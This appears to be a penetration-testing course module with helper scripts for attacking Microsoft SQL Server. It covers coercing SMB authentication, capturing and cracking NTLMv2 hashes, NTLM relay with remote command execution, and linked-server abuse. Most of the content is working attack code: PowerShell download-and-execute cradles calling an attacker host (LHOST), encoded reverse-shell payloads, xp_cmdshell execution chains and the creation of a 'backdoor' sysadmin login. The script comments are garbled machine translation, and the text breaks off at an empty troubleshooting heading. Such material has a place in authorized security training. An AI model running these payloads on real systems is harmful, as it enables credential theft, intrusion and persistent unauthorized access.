::: warning Authorized use only
For the official OSEP labs/exam, or systems you are written-authorized to test. Do not use against unauthorized systems.
:::

# Module 11 — MSSQL: auth triggers, credential capture/relay, and linked servers

Login is not xp_cmdshell. Impersonate, linked servers, or trigger outbound SMB auth.

> **Covers scenarios:** 44, 45
>
> **Course mapping:** scenario 44 → C4; scenario 45 → C2, C6
>
> **Prerequisites:** a SQL Server instance you can log into (SQL auth or Windows auth); attacker box (Kali) reachable from the instance for outbound SMB/445; PowerUpSQL / SQLRecon / Impacket / Responder / ntlmrelayx / hashcat as needed per scenario

---

## Scenario 44: SQL login works, but you cannot run OS commands

**Situation**: You only have a low-privilege database login. Command-execution channels (`xp_cmdshell` / OLE / CLR) are all unavailable. The SQL session identity can still trigger **outbound network authentication** (UNC/SMB). Somewhere in the environment another host allows SMB relay (signing not required), or you can crack a captured Net-NTLMv2 hash offline.

**Assumptions**:
- You already have a working SQL login: SQL auth (`USER`/`PASS`) or domain Windows auth (`DOMAIN\USER`).
- The login is **not** `sysadmin` and cannot enable `xp_cmdshell` (confirm this failure mode first, then take the relay path).
- The instance can open SMB to `\\LHOST\...` (SQL Server runs as a domain or machine account with outbound SMB; if egress is blocked, see "If it fails" and use a tunnel).
- Attacker side ready: `Responder`, `impacket-ntlmrelayx`, `hashcat` + wordlist, PowerUpSQL template scripts, reverse-shell payload.
- SMB signing on the relay target is unknown — probe first, then choose capture vs relay.

**Prepare (attacker)**:

1. Confirm tools:
   ```bash
   which responder impacket-ntlmrelayx impacket-mssqlclient hashcat
   ```
   If Impacket is missing: `sudo apt update && sudo apt install -y impacket-scripts responder hashcat` (Kali usually ships responder / impacket).

2. Build a reverse-shell payload and UTF-16LE + Base64 it (for ntlmrelayx `-c`):
   ```bash
   # 1) Prepare run.ps1 (download+execute stage 2) and place it in the HTTP directory
   echo -en 'IEX ((new-object net.webclient).downloadstring("http://LHOST/run.ps1"))' | iconv -t UTF-16LE | base64 -w 0
   # 2) Put nc64.exe / custom runner / stage-2 files in that directory
   python3 -m http.server 80
   ```

3. (Optional) If the SQL instance is on an internal segment not shared with the attacker box, open the return path with Ligolo-ng first (`Tunneling` → Ligolo-ng): add a listener in the agent session and map attacker 445 through:
   ```
   listener_add --addr 0.0.0.0:445 --to 127.0.0.1:445 --tcp
   ```
   Record the IP that is reachable from the target's perspective as `LHOST`.

4. Probe SMB signing on the relay target (the other host you will hit):
   ```bash
   nmap -p445 --script smb2-security-mode TARGET
   # Expect: Message signing enabled but not required  → relay OK
   #         Message signing enabled and required     → capture + crack only
   ```

**Procedure**:

1. Connect with the low-priv login and confirm you truly cannot run OS commands:
   ```bash
   # From Kali (SQL auth)
   impacket-mssqlclient USER:PASS@TARGET -windows-auth    # domain account: DOMAIN/USER:PASS@TARGET
   ```
   In the mssqlclient session, run:
   ```sql
   SELECT SYSTEM_USER, IS_SRVROLEMEMBER('sysadmin') AS is_sa;
   SELECT name, value_in_use FROM sys.configurations WHERE name = 'xp_cmdshell';
   -- is_sa = 0 and xp_cmdshell value_in_use = 0 → take this scenario's path
   xp_cmdshell whoami
   -- Expect: permission denied (xp_cmdshell needs sysadmin or CONTROL SERVER)
   ```
   From Windows you can also use PowerShell + Invoke-SQLCmd templates (`m11-powerupsql-templates.ps1`).

2. List other SQL instances / targets visible from this instance (which other host is the relay candidate?):
   ```powershell
   # PowerUpSQL: SPN scan
   Get-SQLInstanceDomain
   # Connection test — find reachable instances that may allow relay
   Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose
   ```
   Or CLI: `setspn -T DOMAIN -Q MSSQLSvc/*`.

3. Path A — **capture mode (Responder + crack)**:
   ```bash
   sudo responder -I eth0    # use the real listen interface; defaults cover UDP 53/137/138 + TCP 445, etc.
   ```
   Trigger outbound SQL auth (in the mssqlclient session):
   ```sql
   EXEC master..xp_dirtree '\\LHOST\share';
   -- Often works at low privilege; if denied see "If it fails / alternatives"
   ```
   Expected Responder output (capture success):
   ```
   [SMB] NTLMv2-SSP Client   : ::ffff:<TARGET_IP>
   [SMB] NTLMv2-SSP Username : DOMAIN\sqlservice
   [SMB] NTLMv2-SSP Hash     : sqlservice::DOMAIN:...:...:...:...
   ```
   Offline crack:
   ```bash
   # copy the full hash line from responder into hash.txt
   hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt --force
   ```

4. Path B — **relay mode (ntlmrelayx → eligible target)**:
   ```bash
   # Listen on 445; forward the relayed auth to TARGET (SMB signing not required there)
   # Example: run download+execute on the target under the relayed identity, callback to LHOST
   impacket-ntlmrelayx --no-http-server -smb2support -t smb://TARGET \
     -c "powershell -enc <BASE64_FROM_STEP_2>"
   ```
   If the target is another SQL instance (mssql:// relay — confirm support in your lab):
   ```bash
   impacket-ntlmrelayx --no-http-server -smb2support -t mssql://TARGET2
   ```
   In another terminal:
   ```bash
   nc -nvlp LPORT
   ```
   Trigger auth (from the controlled SQL session; same idea if you have a web shell / other foothold on that host):
   ```sql
   EXEC master..xp_dirtree '\\LHOST\c';
   -- or from Windows: dir \\LHOST\c
   ```
   Expected ntlmrelayx output:
   ```
   [*] SMBD-Thread-4: Received connection from <SQL_HOST>, attacking target smb://TARGET
   [*] Authenticating against smb://TARGET as DOMAIN\sqlservice SUCCEED
   [*] Executed specified command on host: TARGET
   ```

5. Handle results:
   - Capture mode → cleartext password → lateral with netexec smb / psexec / WinRM.
   - Got NTLM hash but no crack → try Pass-The-Hash on hosts that reuse the secret.
   - Relay succeeded → check the reverse-shell listener; on the new shell confirm AV/AMSI (hand off to M05/M07).

6. Common next hops to real execution on SQL (if the environment actually has `sysadmin` or impersonatable principals):
   ```powershell
   # PowerUpSQL audit (find impersonatable logins, etc.)
   Invoke-SQLAudit -Verbose -Instance TARGET
   Invoke-SQLAuditPrivImpersonateLogin -Verbose -Instance TARGET -Exploit
   ```
   See `m11-powerupsql-templates.ps1` (impersonation, CLR templates) and scenario 45 (linked-server path).

**Lab files**:
| File | Purpose | Key args |
|---|---|---|
| `m11-responder-relay-sql.sh` | One-shot Responder capture / ntlmrelayx relay + print SQL trigger statements | `LHOST`, `LPORT`, `TARGET` |
| `m11-powerupsql-templates.ps1` | Instance discovery, priv check, audit, impersonate/execute | `-Instance TARGET` |
| `m11-sqlrecon-templates.ps1` | SQLRecon counterpart templates (`/m:info` `/m:xpcmd`, etc.) | `/h:TARGET /a:WinToken` |
| `m11-linked-server-queries.sql` | Query set for cross-instance enum (also used here to confirm "the other instance") | see file header |


#### `m11-powerupsql-templates.ps1` {#m11-powerupsql-templates-ps1}

````powershell
<#
Use: PowerUpSQL Tracking and execution template - case discovery, authorization confirmation, link crawling(Single/ Multiple)、
      Invoke-SQLOSCmd / CLR / OLE、Impersonation Audit
scene: M11 scene 44（Confirm low permission + Looking for simulated objects) and scenes 45（Get-SQLServerLinkCrawl Jump execution）
Dependency: PowerUpSQL Module (to be imported earlier): Import-Module .\PowerUpSQL.psd1 Or install scripts officially.）；
      Could not close temporary folder: %s 1433；Domain Discovery Class Command Field Windows Host
Use: .\m11-powerupsql-templates.ps1 -Instance TARGET
      .\m11-powerupsql-templates.ps1 -Instance TARGET -Username sa -Password 'P@ssw0rd'
      （No pass. Username/Password Use Current Windows Context Windows Authentication）
Placeholder: TARGET=SQL Example(Yes \Example Name)  USER PASS DOMAIN LHOST LPORT
Test status: Not present Windows + PowerUpSQL Environmental reality; syntax has been manually checked, failure path has been try/catch Hint
Note: This script only runs automatically"Read-only"reconnaissance; xp_cmdshell / Build Login / -Exploit Only print all actions
      Template command, you confirm it and then do it manually.
#>
[CmdletBinding()]
param(
    [Parameter(Mandatory = $true)][string]$Instance,
    [string]$Username,
    [string]$Password
)

# Build common parameters（PowerUpSQL Most cmdlet Accept -Username/-Password/-Domain）
$common = @{ Instance = $Instance }
if ($Username) {
    $common.Username = $Username
    $common.Password = $Password
}

function Section([string]$t) { Write-Output ""; Write-Output ("=" * 14 + " $t " + "=" * 14) }
function Try-PuSql([string]$label, [scriptblock]$block) {
    try { Write-Output ("[+] {0}" -f $label); & $block }
    catch { Write-Output ("[-] {0} Failed: {1}" -f $label, $_.Exception.Message) }
}

# 0) Module usability check
if (-not (Get-Command Get-SQLServerInfo -ErrorAction SilentlyContinue)) {
    Write-Output "[!] Not found PowerUpSQL cmdlet。Execute first: Import-Module .\PowerUpSQL.psd1"
    Write-Output "    Or on the target. IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/NetSPI/PowerUpSQL/master/PowerUpSQL.ps1')"
    Write-Output "    （Source, please use the offline copy you trusted.）"
}

Section "0. Connection testing and server information"
Try-PuSql "Get-SQLServerInfo"       { Get-SQLServerInfo @common -Verbose }
Try-PuSql "Current Login With sysadmin?"    { Get-SQLQuery @common -Query "SELECT SYSTEM_USER, IS_SRVROLEMEMBER('sysadmin') AS is_sa;" }

Section "1. Inner Field SQL Example found (to add) Windows Context）"
Try-PuSql "SPN Scan" {
    Get-SQLInstanceDomain
}
Try-PuSql "Broadcast/connection testing" {
    Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose
}

Section "2. Link server for this instance (scenario) 45 Step one.）"
Try-PuSql "Column Link" {
    Get-SQLQuery @common -Query "SELECT name, is_rpc_out_enabled, is_data_access_enabled FROM sys.servers WHERE is_linked=1;"
}
Try-PuSql "Link Climbing-Toping" {
    Get-SQLServerLinkCrawl @common -Verbose
}

Section "3. Link crawling-jumping execution (scenes) 45 Main use: Auto-jump execution and return results）"
# Example read-only: 
Try-PuSql "Jump execution SELECT @@SERVERNAME" {
    Get-SQLServerLinkCrawl @common -Query "SELECT @@SERVERNAME" -QueryOnLink
}
# Example of command execution (template with remote identification permission; manual execution after confirmation)）: 
Write-Output ""
Write-Output "[*] Far ahead. xp_cmdshell + Execute (manual execution template)）: "
Write-Output "    Get-SQLServerLinkCrawl -Instance $Instance -Query `"exec master..xp_cmdshell 'whoami'`" -QueryOnLink -Verbose"
Write-Output "    Single-jump equivalent:"
Write-Output "    Get-SQLQuery -Instance $Instance -Query `"EXEC ('xp_cmdshell ''whoami''') AT [LINK_NAME]`""

Section "4. Command to execute the tunnel. sysadmin Or after power.）"
Try-PuSql "Invoke-SQLOSCmd whoami" {
    Invoke-SQLOSCmd @common -Command "whoami" -RawResults
}
Write-Output "[*] If xp_cmdshell Stopped/not enabled, template option: "
Write-Output "    Invoke-SQLOSCmdCLR  -Instance $Instance -Command 'powershell.exe whoami' -RawResults   # CLR"
Write-Output "    Invoke-SQLOSCmdOle  -Instance $Instance -Command 'powershell.exe -c whoami' -RawResults  # OLE"
Write-Output "    Open xp_cmdshell（Manual）: EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;"

Section "5. Impersonation Audit (low authority)→sysadmin Common shortcuts）"
Try-PuSql "Modelable Object List" {
    Invoke-SQLAuditPrivImpersonateLogin @common -Verbose
}
Write-Output "[*] I found something to simulate. sa/After high authority login (manual execution, change context of session）: "
Write-Output "    Invoke-SQLAuditPrivImpersonateLogin -Instance $Instance -Exploit"
Write-Output "    or SQL: EXECUTE AS LOGIN='sa'; SELECT SYSTEM_USER; REVERT;"

Section "6. Generic audit (one-time clean-up of common configuration issues)）"
Try-PuSql "Invoke-SQLAudit" {
    Invoke-SQLAudit @common -Verbose
}

Write-Output ""
Write-Output "[*] A line-to-line placeholder can be used to copy the examination notes; first run read-only reconnaissance, action type command confirmed item by item。"
````

#### `m11-responder-relay-sql.sh` {#m11-responder-relay-sql-sh}

````bash
#!/usr/bin/env bash
# =============================================================================
# Use: MSSQL External authentication trigger one-key arrangement——Responder Capture(→hashcat) or ntlmrelayx
#       Organisation SMB target;and printing to SQL Trigger statement and subsequent command executed in session
# scenarios: M11 scene 44（Low Permissions SQL Login → xp_dirtree Waiting for a trigger service account SMB Authentication）
# Dependency: root（Tie 445）；Kali Bring your own responder / impacket-ntlmrelayx / hashcat；
#       nmap（Optional, printing only the signature check proposal); target SQL Katar
# Use: sudo ./m11-responder-relay-sql.sh -i tun0 -m capture
#       sudo ./m11-responder-relay-sql.sh -i tun0 -m relay -t 10.10.10.20 \
#            -c 'powershell -nop -w hidden -enc <BASE64>'
#       ./m11-responder-relay-sql.sh -i tun0 -m relay -t 10.10.10.20 -d   # Print Only Not Execute
# Placeholder: LHOST=Attack aircraft IP  LPORT=Listen Port  TARGET/TARGET2=SQL/Relay objectives
# Test status: Not actually measured in real environment; in-house bash -n Syntax adopted. Logically running for front desk. + Tip Output
# Attention.: Responder and ntlmrelayx You can't take it at the same time. 445；Relay accounts must be the local administrator of the relay target，
#       And target. SMB Signature not mandatory (run signature check first)）
# =============================================================================
set -euo pipefail

IFACE=""
MODE="capture"          # capture | relay
RELAY_TARGET=""
CMD=""
DRY=0
LHOST=""
LOOT_DIR="$HOME/osep/loot/mssql"
TRIGGER_SHARE="a"       # xp_dirtree Triggered shared name. Not available can trigger authentication.

usage() {
    sed -n '2,20p' "$0" | sed 's/^# \{0,1\}//'
    cat <<EOF

Parameters: 
  -i <iface>  Interfacing interfaces (required, e.g.) tun0）
  -m <mode>   capture=Responder Capture+Decrypt (default)） | relay=ntlmrelayx Relay
  -t <host>   relay Relay objectives of the model（IP or smb://IP）
  -c <cmd>    relay Mode of command to the target powershell -enc ...）
  -l <ip>     Attack aircraft IP（For printing trigger statement \\\\LHOST）
  -d          Print command only, not actually start listening
  -h          Help
EOF
    exit 0
}

while getopts "i:m:t:c:l:dh" opt; do
    case "$opt" in
        i) IFACE="$OPTARG" ;;
        m) MODE="$OPTARG" ;;
        t) RELAY_TARGET="$OPTARG" ;;
        c) CMD="$OPTARG" ;;
        l) LHOST="$OPTARG" ;;
        d) DRY=1 ;;
        h) usage ;;
        *) usage ;;
    esac
done

[ -z "$IFACE" ] && { echo "[!] Missing -i Interface parameters"; usage; }
case "$MODE" in capture|relay) ;; *) echo "[!] -m Accept only capture|relay"; exit 1 ;; esac
if [ "$MODE" = "relay" ] && [ -z "$RELAY_TARGET" ]; then
    echo "[!] relay Mode needs -t Relay objectives"; exit 1
fi
[ -z "$LHOST" ] && LHOST="LHOST"   # Manually replace when printing
mkdir -p "$LOOT_DIR"

# Short payload base64 Encoding Support（UTF-16LE → base64，For -c or xp_cmdshell Use）
ps_b64() {
    local text="$1"
    printf '%s' "$text" | iconv -t UTF-16LE | base64 -w 0
    echo
}

preflight() {
    [ "$(id -u)" = "0" ] || { echo "[!] Yes. root（Tie 445）: sudo $0 $*"; exit 1; }
    command -v responder    >/dev/null || { echo "[!] Missing responder"; exit 1; }
    command -v impacket-ntlmrelayx >/dev/null || { echo "[!] Missing impacket-ntlmrelayx"; exit 1; }
    if ss -ltn 2>/dev/null | grep -q ':445 '; then
        echo "[!] 445 Occupied (possibly) Responder I'm already running. Stop and continue."; exit 1
    fi
}

print_trigger() {
    cat <<EOF

================ Yes. SQL Execute in Session（impacket-mssqlclient Interactive / SSMS）========
-- 1) Confirm permissions (this scenario is expected) is_sa=0）
SELECT SYSTEM_USER, IS_SRVROLEMEMBER('sysadmin') AS is_sa;

-- 2) Trigger SQL Server The service account is active on the attacker. SMB Authentication (low permissions often available)）: 
EXEC master..xp_dirtree '\\\\${LHOST}\\${TRIGGER_SHARE}';
-- Alternative Trigger（xp_dirtree If rejected, try it one by one.）: 
EXEC master..xp_subdirs '\\\\${LHOST}\\${TRIGGER_SHARE}';
EXEC master..xp_fileexist '\\\\${LHOST}\\${TRIGGER_SHARE}';
-- Library Level BACKUP Permissions when available: BACKUP DATABASE [master] TO DISK = '\\\\${LHOST}\\share\\b.bak';
================================================================================
EOF
}

print_loot() {
    echo "[*] Inventory of catch products: $LOOT_DIR"
    echo "[*] Break: hashcat -m 5600 $LOOT_DIR/hash.txt /usr/share/wordlists/rockyou.txt"
    echo "[*] Short payload Example of encoding: "
    ps_b64 'IEX((New-Object Net.WebClient).DownloadString("http://LHOST/p.ps1"))' \
        | sed 's/^/    /'
}

if [ "$DRY" = "1" ]; then
    echo "[DRY] To be implemented: "
    echo "  responder:  sudo responder -I $IFACE"
    echo "  ntlmrelayx: sudo impacket-ntlmrelayx --no-http-server -smb2support -t smb://$RELAY_TARGET -c '$CMD'"
    print_trigger
    print_loot
    exit 0
fi

preflight

# Prompt signature check before relay（nmap It's optional, but it's not supposed to continue.）
if [ "$MODE" = "relay" ]; then
    echo "[*] It is recommended that relay targets be identified first. SMB Signature not mandatory: "
    echo "    nmap -p445 --script smb2-security-mode $RELAY_TARGET"
    echo "    crackmapexec smb $RELAY_TARGET --signing-check"
    [ -n "$CMD" ] || CMD="whoami"   # Give a secure default on empty commands to verify links
fi

print_trigger

if [ "$MODE" = "capture" ]; then
    echo "[*] Start Responder（Ctrl-C Stop. Log on screen.）……"
    sudo responder -I "$IFACE" | tee "$LOOT_DIR/responder-$(date +%H%M%S).log"
else
    echo "[*] Start ntlmrelayx → smb://$RELAY_TARGET（Ctrl-C Stop）……"
    sudo impacket-ntlmrelayx --no-http-server -smb2support \
        -t "smb://$RELAY_TARGET" -c "$CMD"
fi

print_loot
````

#### `m11-sqlrecon-templates.ps1` {#m11-sqlrecon-templates-ps1}

````powershell
<#
Use: SQLRecon.exe Template Encapsulation - Enumeration(sqlspns)、info/whoami、links Series、
      enablexp/xpcmd、enableole/olecmd、impersonate Group
scene: M11 scene 44/45（Existing Windows Organisation SQLRecon.exe Use after）
Dependency: SQLRecon.exe（You have to deliver it first. Windows Objectives, such as c:\windows\tasks\SQLRecon.exe）；
      Authentication parameters /a:WinToken Use current Windows token (most common)），SQL Authentication /a:Local /u: /p:
Use: .\m11-sqlrecon-templates.ps1 -ReconExe .\SQLRecon.exe -Host TARGET
      Function name is the module name. See below EXAMPLES；A single note can follow the instructions in the note. Okay.
Placeholder: TARGET=SQL Host(or Host\Example)  DOMAIN USER PASS LHOST LPORT
Test status: Not present Windows + SQLRecon environment; only by cheat sheet Parameter Shape of Intake Module Collapse
Attention.: SQLRecon Parameter Case/Speech to Download Version README (if) /h: and /host: There's a difference between the old and new editions.）
#>
[CmdletBinding()]
param(
    [string]$ReconExe = ".\SQLRecon.exe",   # Path after delivery
    [string]$Target,                        # -Host TARGET
    [string]$Auth = "WinToken",             # WinToken(Default) / Local(SQLAuthentication) / Token / Windows
    [string]$Domain,
    [string]$User,
    [string]$Pass
)

# Parameters for authentication
function Get-AuthArgs {
    $a = @("/a:$Auth")
    if ($Domain) { $a += "/d:$Domain" }
    if ($User)   { $a += "/u:$User" }
    if ($Pass)   { $a += "/p:$Pass" }
    return $a
}

# Universal Caller: Invoke-M11SqlRecon -Module xpcmd -Command "whoami" [-Impersonate sa]
function Invoke-M11SqlRecon {
    param(
        [Parameter(Mandatory = $true)][string]$Module,   # See list of modules below
        [string]$Command,                                 # Modules that require command parameters
        [string]$Impersonate                              # /i:sa Group
    )
    $args = @($script:ReconExe) + (Get-AuthArgs)
    if ($script:Target) { $args += "/h:$($script:Target)" }
    if ($Impersonate)   { $args += "/i:$Impersonate" }
    $args += "/m:$Module"
    if ($Command) { $args += "/c:$Command" }
    Write-Output ("[>] " + ($args -join ' '))
    & $args
}

# ---------------------------------------------------------------------------
# List of modules (by cheat sheet MSSQL → SQLRecon receiving;no output module = Direct execution no return）
#   /enum:sqlspns         Inner Field SPN Enumeration (used) /d:DOMAIN，No need. /h:）
#   /m:info /m:whoami     Server Information / Current Identity
#   /m:links /m:linkinfo  Column Link / Link Details
#   /m:linkquery /m:linkcmd  Linked / Linked to execute command (required remote access, scene) 45）
#   /m:impersonate        List simulable login (cooperating) /i: With another module）
#   /m:enablexp /m:xpcmd  Open xp_cmdshell / Execute Command
#   /m:enableole /m:olecmd  Open OLE Automation / OLE Execute (no console echo)）
# ---------------------------------------------------------------------------

Write-Output "===== EXAMPLES（Copy directly to shell，Replace Placeholder）====="
@"

-- Inner Field SQL Found
.\SQLRecon.exe /enum:sqlspns /d:DOMAIN

-- Basic reconnaissance (scenario) 44: Identification/authority first）
.\SQLRecon.exe /a:WinToken /h:TARGET /m:info
.\SQLRecon.exe /a:WinToken /h:TARGET /m:whoami

-- Low Permission Executable List: Simulable Object (Scene) 44 Alternative to delegation of authority）
.\SQLRecon.exe /a:WinToken /h:TARGET /m:impersonate

-- Group: Simulation sa Back open. xp_cmdshell Implementation 44 Land.）
.\SQLRecon.exe /a:WinToken /h:TARGET /m:impersonate /i:sa /m:enablexp
.\SQLRecon.exe /a:WinToken /h:TARGET /m:impersonate /i:sa /m:xpcmd /c:"whoami /all"

-- Already sysadmin: Straight ahead. + Implementation
.\SQLRecon.exe /a:WinToken /h:TARGET /m:enablexp
.\SQLRecon.exe /a:WinToken /h:TARGET /m:xpcmd /c:"whoami /all"

-- Linked reconnaissance (scenario) 45）
.\SQLRecon.exe /a:WinToken /h:TARGET /m:links
.\SQLRecon.exe /a:WinToken /h:TARGET /m:linkquery /c:"SELECT @@SERVERNAME"
.\SQLRecon.exe /a:WinToken /h:TARGET /m:linkcmd /c:"whoami"

-- The command is given. AV/It's restricted. OLE Channels (no echoes, matching backlink/writing file validation)）
.\SQLRecon.exe /a:WinToken /h:TARGET /m:enableole
.\SQLRecon.exe /a:WinToken /h:TARGET /m:olecmd /c:"powershell.exe -c iex(iwr http://LHOST/met.ps1)"

-- SQL Form of authentication (when proof is required)）
.\SQLRecon.exe /a:Local /h:TARGET /u:sa /p:PASS /m:info
"@ | Write-Output

# ---------------------------------------------------------------------------
# Call for example of encapsulation (script tape) -Target/-Auth While running a read-only reconnaissance.）
# ---------------------------------------------------------------------------
if ($Target) {
    Write-Output ""
    Write-Output "===== Read-only reconnaissance output ====="
    Invoke-M11SqlRecon -Module info
    Invoke-M11SqlRecon -Module whoami
    Invoke-M11SqlRecon -Module links
}
````

#### `m11-linked-server-queries.sql` {#m11-linked-server-queries-sql}

````sql
-- ============================================================================
-- Use: Linked Server Reconnaissance and remote execution template - single jump/multiple Jump.、EXEC ... AT、Quote transposition、
--       OPENQUERY Alternative、RPC/Map Scanning
-- scene: M11 scene 45（Linked Server Queryable, but remote execution failed; scene 44 Use it to find other examples
-- Dependency: SQL Server 2008+；Yes. impacket-mssqlclient Interactive session、SSMS or sqlcmd Paragraph by paragraph
--       （impacket-mssqlclient Take another one. enable_xp_cmdshell / xp_cmdshell Shortcut Command）
-- Use: Copy the paragraph after login; LINK1 / LINK2 Change to the actual link server name
--       （Link name with inverse slash as 10.0.0.5\SQLEXPRESS Square brackets [10.0.0.5\SQLEXPRESS] Block）
-- Placeholder: LINK1=A remote jump example.  LINK2=Two-jump remote instance  LHOST=Attack aircraft IP  BASE64=Short payload
-- Test status: Not real SQL Examples measured (no local example available); cross-checked manually by single quote
-- Quote Iron.: SQL Double all single quotes in a string ''；Each embedded layer EXEC ... AT，We'll double the quote.
-- ============================================================================

-- ---------------------------------------------------------------------------
-- I don't think so. 1 Paragraph: Confirmation first"Myself."Permissions in Local Examples and xp_cmdshell Status
-- ---------------------------------------------------------------------------
SELECT SYSTEM_USER AS login_user, IS_SRVROLEMEMBER('sysadmin') AS is_sa;
SELECT name, value_in_use FROM sys.configurations WHERE name = 'xp_cmdshell';

-- ---------------------------------------------------------------------------
-- I don't think so. 2 Paragraph: List all links and switches（"Query"Look. data access，"Remotely execute"Look. rpc out）
-- ---------------------------------------------------------------------------
SELECT name, product, is_linked,
       is_rpc_out_enabled      AS rpc_out,          -- EXEC ... AT Reliance on this
       is_data_access_enabled  AS data_access,      -- OPENQUERY Reliance on this
       is_remote_login_enabled
FROM sys.servers WHERE is_linked = 1;

EXEC sp_linkedservers;                             -- Compatibility of old versions/information

-- ---------------------------------------------------------------------------
-- I don't think so. 3 Paragraph: Measurement"Query, execution, no."Boundary
-- ---------------------------------------------------------------------------
-- (a) OPENQUERY Single-jump queries: relying only on data access，Not dependent rpc out
SELECT * FROM OPENQUERY([LINK1],
    'SELECT @@SERVERNAME AS srv, SYSTEM_USER AS u,
            IS_SRVROLEMEMBER(''sysadmin'') AS is_sa');

-- (b) EXEC ... AT: Dependency rpc out。Failure to deliver the wrong decision on the next step: 
--     "is not configured for RPC" / "not enabled for remote procedure call"
--       → rpc out Close → I don't think so. 4 Paragraph
--     "Login failed for user 'NT AUTHORITY\ANONYMOUS LOGON'" → Double jump assignment. → I don't think so. 8 Paragraph Notes
EXEC ('SELECT @@SERVERNAME') AT [LINK1];

-- ---------------------------------------------------------------------------
-- I don't think so. 4 Section: Switch repair (required) sysadmin / ALTER ANY LINKED SERVER；Try low permission first EXECUTE AS）
-- ---------------------------------------------------------------------------
EXECUTE AS LOGIN = 'sa';                           -- Just when you have IMPERSONATE Permissions are successful.
EXEC sp_serveroption 'LINK1', 'rpc out', 'true';
EXEC sp_serveroption 'LINK1', 'data access', 'true';
REVERT;

SELECT name, is_rpc_out_enabled, is_data_access_enabled
FROM sys.servers WHERE name = 'LINK1';

-- ---------------------------------------------------------------------------
-- I don't think so. 5 Paragraph: rpc out When it's closed, it won't change. OPENQUERY "Read it." xp_cmdshell Output
-- （xp_cmdshell The result set can be OPENQUERY Read as a watch; premise: far away xp_cmdshell Available
--   and the link data access = true）
-- ---------------------------------------------------------------------------
SELECT * FROM OPENQUERY([LINK1], 'EXEC master..xp_cmdshell ''whoami''');

-- ---------------------------------------------------------------------------
-- I don't think so. 6 Section: Who is the remote map account (at the heart of the difference in privileges)）
-- ---------------------------------------------------------------------------
SELECT s.name AS link,
       l.remote_name,                              -- Remote login；NULL/Empty string = guest
       l.uses_self_credential                      -- 1=Map as Local Login
FROM sys.servers s
LEFT JOIN sys.linked_logins l ON s.server_id = l.server_id
WHERE s.is_linked = 1;

-- Remote Identifier LINK1 Execute & Reply）
SELECT * FROM OPENQUERY([LINK1],
    'SELECT SYSTEM_USER AS remote_user, IS_SRVROLEMEMBER(''sysadmin'') AS is_sa');

-- ---------------------------------------------------------------------------
-- I don't think so. 7 Section: Single-jump execution chain (distant identity is sysadmin (when) — in sequence
-- ---------------------------------------------------------------------------
-- (1) Yes. LINK1 Open Remotely Up xp_cmdshell（'show advanced options' It's a simultaneous drive.）
EXEC ('sp_configure ''show advanced options'', 1; reconfigure;
       sp_configure ''xp_cmdshell'', 1; reconfigure;') AT [LINK1];

-- (2) Verify remote command execution
EXEC ('xp_cmdshell ''whoami''') AT [LINK1];

-- (3) Short payload Implementation (the most stable form)）: 
--     First. Kali Up Generate BASE64（Downloader itself, length controlled）: 
--     echo -en 'IEX((New-Object Net.WebClient).DownloadString("http://LHOST/p.ps1"))' \
--       | iconv -t UTF-16LE | base64 -w 0
EXEC ('xp_cmdshell ''powershell -nop -w hidden -enc BASE64''') AT [LINK1];

-- (4) If the remote map sa And you want to go straight to the far end.）: 
EXEC ('EXEC sp_addlogin ''backdoor'', ''P@ssw0rd!''') AT [LINK1];
EXEC ('EXEC sp_addsrvrolemember ''backdoor'', ''sysadmin''') AT [LINK1];
-- And from Kali Straight Company: impacket-mssqlclient backdoor:P@ssw0rd!@LINK1_HOST

-- ---------------------------------------------------------------------------
-- I don't think so. 8 Segment: Multijump A → B(LINK1) → C(LINK2): Every layer EXEC AT Embedded. Double the quote.
-- ---------------------------------------------------------------------------
-- First. B Look at the links.（B Perspective. sys.servers）
SELECT * FROM OPENQUERY([LINK1],
    'SELECT name FROM sys.servers WHERE is_linked = 1');

-- From A Here we go. C Implementation whoami（After parsing A→B The string sent is: 
--   EXEC ('xp_cmdshell ''whoami''') AT [LINK2]，B I'll be right back. C Implementation）
EXEC ('EXEC (''xp_cmdshell ''''whoami'''''') AT [LINK2]') AT [LINK1];

-- Keep moving. xp_cmdshell（The same rule, double the layer.；'show advanced options' Same thing.）
EXEC ('EXEC (''sp_configure ''''show advanced options'''', 1; reconfigure;
              sp_configure ''''xp_cmdshell'''', 1; reconfigure;'') AT [LINK2]') AT [LINK1];

-- Multiple Jump Query (Inner Layer) OPENQUERY Double all quotes）
SELECT * FROM OPENQUERY([LINK1],
    'SELECT * FROM OPENQUERY([LINK2], ''SELECT @@SERVERNAME AS srv'')');

-- Note: If reported "Login failed for user 'NT AUTHORITY\ANONYMOUS LOGON'"
--     → B→C Need to pass the papers.（Kerberos Double jump) stopped; alternative: from B Read it. C after the connection string
--       mssqlclient Straight Company C（port can reach) or leave execution only for data reading。

-- ---------------------------------------------------------------------------
-- I don't think so. 9 Paragraph: Commonly reported errors
-- ---------------------------------------------------------------------------
-- "is not configured for RPC" / "not enabled for remote procedure call"
--     → The Link rpc out = false → I don't think so. 4 Sector open;not authorized → I don't think so. 5 Paragraph OPENQUERY Read Execute
-- "Ad Hoc Distributed Queries" / "cannot be used for distributed queries"
--     → data access / Distribution query not opened → I don't think so. 4 Break data access
-- "EXECUTE permission denied on object 'xp_cmdshell'"
--     → Remote Map Account Not sysadmin → I don't think so. 6 segment mapping;to local rights sysadmin Then we'll take the link.
-- "Login failed for user 'NT AUTHORITY\ANONYMOUS LOGON'"
--     → Double jump assignment. → I don't think so. 8 Paragraph Notes
-- "Msg 102 / Incorrect syntax near ..."
--     → The number of quotes is wrong. → Check. 8 Multiplier segment by segment
-- ============================================================================
````

**Verify**:
- `[SMB] NTLMv2-SSP Hash ' Line `Successful capture; `hashcat ' expressly available on the basis of evidence (`netexec smb ' or `evil-winrm ' ).
- `Authentising ... SUCCED ' and `Expected trained commission on host ' relay success; reverse shell end.
- Check `nc-nvlp LPORT ' to receive connections and interact with `whoami ' if only to have a stable connection.

**If it fails / alternatives**:
